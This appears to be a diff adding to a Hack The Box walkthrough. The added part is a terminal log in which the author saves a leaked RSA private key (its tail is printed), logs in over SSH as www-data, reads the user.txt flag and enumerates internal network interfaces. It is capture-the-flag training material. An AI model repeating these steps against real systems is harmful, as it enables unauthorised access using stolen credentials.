@@ -352,3 +352,72 @@ sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
 s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
 -----END RSA PRIVATE KEY-----
 ```
+
+```
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# nvim id_rsa_www-data  
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# chmod 600 id_rsa_www-data
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# ssh -i id_rsa_www-data www-data@10.129.186.91 -p 2222
+The authenticity of host '[10.129.186.91]:2222 ([10.129.186.91]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:hki6VXu+ef1RkYZkYFiyIaNgPd6e7boZm9pH7yJDQUI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.129.186.91]:2222' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
+www-data@web:~$ ls -la
+total 16
+drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 .
+drwxr-xr-x 3 root     root     4096 Jun 14 07:56 ..
+lrwxrwxrwx 1 root     root        9 Jun 14 08:02 .bash_history -> /dev/null
+drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache
+drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh
+www-data@web:~$ cd /home
+www-data@web:/home$ ls -la
+total 16
+drwxr-xr-x 3 root     root     4096 Jun 14 07:56 .
+drwxr-xr-x 1 root     root     4096 Dec  6 14:46 ..
+-rw-r--r-- 1 root     root       33 Apr  3  2020 user.txt
+drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data
+www-data@web:/home$ cat user.txt
+c3f343befcac5fa92fb5373456e94247
+www-data@web:/home$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
+        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
+        RX packets 466  bytes 145895 (145.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 336  bytes 87689 (87.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
+        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
+        RX packets 27  bytes 10566 (10.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9  bytes 627 (627.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 20  bytes 1055 (1.0 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20  bytes 1055 (1.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+       
+```
+
